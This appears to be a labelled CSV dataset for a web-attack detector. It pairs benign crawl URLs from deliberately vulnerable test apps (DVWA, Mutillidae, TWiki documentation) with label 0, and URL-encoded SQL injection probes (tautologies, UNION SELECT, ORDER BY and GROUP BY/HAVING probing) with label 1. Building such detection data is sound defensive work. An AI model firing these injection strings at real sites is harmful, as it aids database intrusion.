URI,label
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/1,0
test.com/dvwa/about.php/20,0
test.com/dvwa/about.php/21,0
test.com/dvwa/about.php/22,0
test.com/dvwa/about.php/23,0
test.com/dvwa/about.php/24,0
test.com/dvwa/about.php/25,0
test.com/dvwa/about.php/26,0
test.com/dvwa/about.php/27,0
test.com/dvwa/about.php/28,0
test.com/dvwa/about.php/29,0
test.com/dvwa/about.php/19,0
test.com/dvwa/about.php/18,0
test.com/dvwa/about.php/17,0
test.com/dvwa/about.php/16,0
test.com/dvwa/about.php/15,0
test.com/dvwa/about.php/14,0
test.com/dvwa/about.php/13,0
test.com/dvwa/about.php/12,0
test.com/dvwa/about.php/11,0
test.com/dvwa/about.php/10,0
test.com/dvwa/about.php/9,0
test.com/dvwa/about.php/8,0
test.com/dvwa/about.php/7,0
test.com/dvwa/about.php/6,0
test.com/dvwa/about.php/5,0
test.com/dvwa/about.php/4,0
test.com/dvwa/about.php/3,0
test.com/dvwa/about.php/2,0
test.com/dvwa/about.php/1,0
test.com/dav/?Y=N;O=U,0
test.com/dav/?X=N;O=U,0
test.com/dav/?W=N;O=U,0
test.com/dav/?V=N;O=U,0
test.com/dav/?U=N;O=U,0
test.com/dav/?T=N;O=U,0
test.com/dav/?R=N;O=U,0
test.com/dav/?Q=N;O=U,0
test.com/dav/?P=N;O=U,0
test.com/dav/?O=N;O=U,0
test.com/dav/?N=N;O=U,0
test.com/dav/?M=N;O=U,0
test.com/dav/?L=N;O=U,0
test.com/dav/?K=N;O=U,0
test.com/dav/?I=N;O=U,0
test.com/dav/?J=N;O=U,0
test.com/dav/?H=N;O=U,0
test.com/dav/?G=N;O=U,0
test.com/dav/?F=N;O=U,0
test.com/dav/?E=N;O=U,0
test.com/dav/?D=N;O=U,0
test.com/dav/?B=N;O=U,0
test.com/dav/?A=N;O=U,0
test.com/dav/?C=N;O=U,0
test.com/dav/?C=N;O=T,0
test.com/dav/?C=N;O=S,0
test.com/dav/?C=N;T=T,0
test.com/dav/?C=N;O=R,0
test.com/dav/?C=N;O=Q,0
test.com/dav/?C=N;O=P,0
test.com/dav/?C=N;O=O,0
test.com/dav/?C=N;O=N,0
test.com/dav/?C=N;O=M,0
test.com/dav/?C=N;O=M,0
test.com/dav/?C=N;O=L,0
test.com/dav/?C=N;O=K,0
test.com/dav/?C=N;O=J,0
test.com/dav/?C=N;O=I,0
test.com/dav/?C=N;O=H,0
test.com/dav/?C=N;O=G,0
test.com/dav/?C=N;O=F,0
test.com/dav/?C=N;O=E,0
test.com/dav/?C=N;O=C,0
test.com/dav/?C=N;O=D,0
test.com/dav/?C=N;O=B,0
test.com/dav/?C=N;O=A,0
test.com/mutillidae/index.php?page=home.php,0
test.com/mutillidae/index.php?page=login.php,0
test.com/mutillidae/set-up-database.php,0
test.com/mutillidae/index.php?page=change-log.htm,0
test.com/mutillidae/index.php?page=installation.php,0
test.com/mutillidae/index.php?page=documentation/vulnerabilities.php,0
test.com/mutillidae/index.php?page=user-info.php,0
test.com/dvwa/login.php,0
test.com/dvwa/security.php,0
test.com/dvwa/about.php,0
test.com/dvwa/setup.php,0
test.com/dvwa/vulnerabilities/brute/,0
test.com/dvwa/vulnerabilities/exec/,0
test.com/dvwa/vulnerabilities/csrf/,0
test.com/dvwa/vulnerabilities/fi/?page=include.php,0
test.com/phpMyAdmin/,0
test.com/twiki/TWikiDocumentation.html,0
test.com/twiki/TWikiDocumentation.html#The_Go_Box_and_Navigation_Box,0
test.com/twiki/TWikiDocumentation.html#TWiki_System_Requirements,0
test.com/twiki/TWikiDocumentation.html#Server_Requirements,0
test.com/twiki/TWikiDocumentation.html#Client_Requirements,0
test.com/twiki/TWikiDocumentation.html#Known_Issues,0
test.com/twiki/TWikiDocumentation.html#TWiki_Installation_Guide,0
test.com/twiki/TWikiDocumentation.html#Standard_Installation,0
test.com/twiki/TWikiDocumentation.html#Step_1_Create_Configure_the_Dire,0
test.com/twiki/TWikiDocumentation.html#Step_1_for_Non_Root_Accounts,0
test.com/twiki/TWikiDocumentation.html#Step_2_Set_File_Permissions,0
test.com/twiki/TWikiDocumentation.html#Step_3_Set_the_Main_Configuratio,0
test.com/twiki/TWikiDocumentation.html#Step_4_Configure_Site_Wide_Email,0
test.com/twiki/TWikiDocumentation.html#Step_5_Finish_Up_from_Your_Brows,0
test.com/twiki/TWikiDocumentation.html#Additional_Server_Level_Options,0
test.com/twiki/TWikiDocumentation.html#Enabling_Authentication_of_Users,0
test.com/twiki/TWikiDocumentation.html#Restricting_Read_Access,0
test.com/twiki/TWikiDocumentation.html#Deny_Viewing_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Deny_Viewing_by_Web,0
test.com/twiki/TWikiDocumentation.html#Obfuscate_Webs,0
test.com/twiki/TWikiDocumentation.html#TWiki_File_System_Info,0
test.com/twiki/TWikiDocumentation.html#Alternatives,0
test.com/twiki/TWikiDocumentation.html#Deny_Renaming_by_Web,0
test.com/twiki/TWikiDocumentation.html#Checking_versions,0
test.com/twiki/TWikiDocumentation.html#Credits,0
test.com/twiki/TWikiDocumentation.html#TWiki_Upgrade_Guide,0
test.com/twiki/TWikiDocumentation.html#Overview,0
test.com/twiki/TWikiDocumentation.html#Upgrade_Requirements,0
test.com/twiki/TWikiDocumentation.html#Major_Changes_from_TWiki_01_Dec_,0
test.com/twiki/TWikiDocumentation.html#Upgrade_Procedure_from_01_Dec_20,0
test.com/twiki/TWikiDocumentation.html#Apache,0
test.com/twiki/TWikiDocumentation.html#Cygwin_Unix_tools_Perl_and_RCS,0
test.com/twiki/TWikiDocumentation.html#TWiki_part_2_,0
test.com/twiki/TWikiDocumentation.html#Configuring_components,0
test.com/twiki/TWikiDocumentation.html#Configuring_Apache,0
test.com/twiki/TWikiDocumentation.html#Editing_the_CGI_scripts,0
test.com/twiki/TWikiDocumentation.html#Perl_module_installation,0
test.com/twiki/TWikiDocumentation.html#Re_locking_RCS_files,0
test.com/twiki/TWikiDocumentation.html,0
test.com/twiki/TWikiDocumentation.html#TWiki_User_Authentication,0
test.com/twiki/TWikiDocumentation.html#Users_and_Groups,0
test.com/twiki/TWikiDocumentation.html#An_Important_Control_Considerati,0
test.com/twiki/TWikiDocumentation.html#Deny_Editing_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Authentication_Options,0
test.com/twiki/TWikiDocumentation.html#Deny_Editing_by_Web,0
test.com/twiki/TWikiDocumentation.html#Deny_Renaming_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Restricting_Rename_Access,0
test.com/twiki/TWikiDocumentation.html#Managing_Users,0
test.com/twiki/TWikiDocumentation.html#Managing_Groups,0
test.com/twiki/TWikiDocumentation.html#Restricting_Write_Access,0
test.com/twiki/TWikiDocumentation.html#Authenticate_all_Webs_and_Restri,0
test.com/twiki/TWikiDocumentation.html#Authenticate_and_Restricting_Sel,0
test.com/twiki/TWikiDocumentation.html#Hiding_Control_Settings,0
test.com/twiki/TWikiDocumentation.html#The_SuperAdminGroup,0
test.com/twiki/TWikiDocumentation.html#TWiki_Text_Formatting,0
test.com/twiki/TWikiDocumentation.html#TWiki_Editing_Shorthand,0
test.com/twiki/TWikiDocumentation.html#Using_HTML,0
test.com/twiki/TWikiDocumentation.html#TWiki_HTML_Rendering,0
test.com/twiki/TWikiDocumentation.html#Hyperlinks,0
test.com/twiki/TWikiDocumentation.html#Internal_Links,0
test.com/twiki/TWikiDocumentation.html#TWikiPlugin_Formatting_Extension,0
test.com/twiki/TWikiDocumentation.html#TWiki_Variables,0
test.com/twiki/TWikiDocumentation.html#Common_Editing_Errors,0
test.com/twiki/TWikiDocumentation.html#Predefined_Variables,0
test.com/twiki/TWikiDocumentation.html#Preferences_Variables,0
test.com/twiki/TWikiDocumentation.html#Setting_Preferences,0
test.com/twiki/TWikiDocumentation.html#Creating_Custom_Variables,0
test.com/twiki/TWikiDocumentation.html#File_Attachments,0
test.com/twiki/TWikiDocumentation.html#What_Are_Attachments_Good_For_,0
test.com/twiki/TWikiDocumentation.html#Document_Management_System,0
test.com/twiki/TWikiDocumentation.html#File_Sharing,0
test.com/twiki/TWikiDocumentation.html#Web_Authoring,0
test.com/twiki/TWikiDocumentation.html#Uploading_Files,0
test.com/twiki/TWikiDocumentation.html#Downloading_Files,0
test.com/twiki/TWikiDocumentation.html#Moving_Attachment_Files,0
test.com/twiki/TWikiDocumentation.html#Deleting_Attachments,0
test.com/twiki/TWikiDocumentation.html#Linking_to_Attached_Files,0
test.com/twiki/TWikiDocumentation.html#File_Attachment_Contents_Table,0
test.com/twiki/TWikiDocumentation.html#File_Attachment_Controls,0
test.com/twiki/TWikiDocumentation.html#TWiki_Forms,0
test.com/twiki/TWikiDocumentation.html#Main_Changes_from_Category_Table,0
test.com/twiki/TWikiDocumentation.html#Importing_Category_Table_Data,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_Template,0
test.com/twiki/TWikiDocumentation.html#Form_Template_Elements,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_in_One_Topic,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_with_Multiple_To,0
test.com/twiki/TWikiDocumentation.html#Enabling_Forms_by_Web,0
test.com/twiki/TWikiDocumentation.html#Including_Forms_in_New_Topics,0
test.com/twiki/TWikiDocumentation.html#Setting_Up_Multiple_Form_Options,0
test.com/twiki/TWikiDocumentation.html#Form_Data_Storage,0
test.com/twiki/TWikiDocumentation.html#Using_Form_Data,0
test.com/twiki/TWikiDocumentation.html#TWiki_Templates,0
test.com/twiki/TWikiDocumentation.html#Major_changes_from_the_previous_,0
test.com/twiki/TWikiDocumentation.html#How_Template_Variables_Work,0
test.com/twiki/TWikiDocumentation.html#Types_of_Template,0
test.com/twiki/TWikiDocumentation.html#Master_Templates,0
test.com/twiki/TWikiDocumentation.html#HTML_Page_Templates,0
test.com/twiki/TWikiDocumentation.html#Template_Topics,0
test.com/twiki/TWikiDocumentation.html#Edit_Template_Topics_and_Variabl,0
test.com/twiki/TWikiDocumentation.html#Template_Topics_in_Action,0
test.com/twiki/TWikiDocumentation.html#Templates_by_Example,0
test.com/twiki/TWikiDocumentation.html#Base_template_oopsbase_tmpl,0
test.com/twiki/TWikiDocumentation.html#Test_template_oopstest_tmpl,0
test.com/twiki/TWikiDocumentation.html#Sample_screen_shot_of_oopstest_t,0
test.com/twiki/TWikiDocumentation.html#TWiki_Skins,0
test.com/twiki/TWikiDocumentation.html#Defining_Skins,0
test.com/twiki/TWikiDocumentation.html#Variables_in_Skins,0
test.com/twiki/TWikiDocumentation.html#Packaging_and_Publishing_Skins,0
test.com/twiki/TWikiDocumentation.html#Activating_Skins,0
test.com/twiki/TWikiDocumentation.html#TWiki_Formatted_Search_Results,0
test.com/twiki/TWikiDocumentation.html#Syntax,0
test.com/twiki/TWikiDocumentation.html#Bullet_list_showing_topic_name_a,0
test.com/twiki/TWikiDocumentation.html#Table_showing_form_field_values_,0
test.com/twiki/TWikiDocumentation.html#Extract_some_text_from_a_topic_u,0
test.com/twiki/TWikiDocumentation.html#Nested_Search,0
test.com/twiki/TWikiDocumentation.html#TWiki_Meta_Data,0
test.com/twiki/TWikiDocumentation.html#Meta_Data_Syntax,0
test.com/twiki/TWikiDocumentation.html#Meta_Data_Specifications,0
test.com/twiki/TWikiDocumentation.html#META_TOPICINFO,0
test.com/twiki/TWikiDocumentation.html#META_TOPICMOVED,0
test.com/twiki/TWikiDocumentation.html#META_TOPICPARENT,0
test.com/twiki/TWikiDocumentation.html#META_FILEATTACHMENT,0
test.com/twiki/TWikiDocumentation.html#META_FORM,0
test.com/twiki/TWikiDocumentation.html#META_FIELD,0
test.com/twiki/TWikiDocumentation.html#Recommended_Sequence,0
test.com/twiki/TWikiDocumentation.html#Viewing_Meta_Data_in_Page_Source,0
test.com/twiki/TWikiDocumentation.html#Rendering_Meta_Data,0
test.com/twiki/TWikiDocumentation.html#TWiki_Plugins,0
test.com/twiki/TWikiDocumentation.html#Preinstalled_Plugins,0
test.com/twiki/TWikiDocumentation.html#Installing_Plugins,0
test.com/twiki/TWikiDocumentation.html#On_Site_Pretesting,0
test.com/twiki/TWikiDocumentation.html#The_TWiki_Plugin_API,0
test.com/twiki/TWikiDocumentation.html#Available_Core_Functions,0
test.com/twiki/TWikiDocumentation.html#Predefined_Hooks,0
test.com/twiki/TWikiDocumentation.html#Plugin_Version_Detection,0
test.com/twiki/TWikiDocumentation.html#Creating_Plugins,0
test.com/twiki/TWikiDocumentation.html#The_DefaultPlugin_Alternative,0
test.com/twiki/TWikiDocumentation.html#Anatomy_of_a_Plugin,0
test.com/twiki/TWikiDocumentation.html#Creating_the_Perl_Module,0
test.com/twiki/TWikiDocumentation.html#Writing_the_Documentation_Topic,0
test.com/twiki/TWikiDocumentation.html#Packaging_for_Distribution,0
test.com/twiki/TWikiDocumentation.html#Publishing_for_Public_Use,0
test.com/sqli/?id=%27+or+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1%27+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+1=1+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+and+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+or+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1+--+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+1=1+--+%22&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+1+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+50+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+07+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+67+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+80+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+1000+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+IS+%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+9+IS+%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+100+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%2756&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27UNION+SELECT+%27800&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27UNION+SELECT+%2710&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27UNION+SELECT+%2745&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%2734&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27290&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+--+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+--+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%2720&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%27500&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27AND+1=1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27and+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%27%27%27%271%2B&Submit=Submit#,1
test.com/sqli/?id=117%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+AND+1=1%27%27---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+or+%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1-%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27%27%27+ORDER+BY+or+%27%271=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+%271=%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=3%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+10--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+%271=1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112---%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+=+1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+ORDER+BY+--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+-%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=3899%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=39%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=99%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=100%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=10000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=200%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=29%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=9%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+email+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+lname+having+1%3D1+----&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+mname+having+1%3D1%27%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+%271%3D%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D%271+-&Submit=Submit#,1
test.com/sqli/?id=GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1%27%27%27+--&Submit=Submit#",1
